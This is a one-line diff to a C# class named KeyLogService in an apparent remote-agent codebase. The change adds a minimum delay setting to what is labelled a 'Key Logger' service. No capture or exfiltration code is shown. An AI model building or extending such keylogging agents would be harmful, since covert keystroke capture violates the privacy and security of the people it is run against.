@@ -13,6 +13,7 @@ namespace Agent.Service
     }
     public class KeyLogService : RunningService, IKeyLogService
     {
+        public override int MinimumDelay { get => 2; }
         protected override JobType? JobType => Shared.JobType.KeyLog;
         public override string ServiceName => "Key Logger";
 
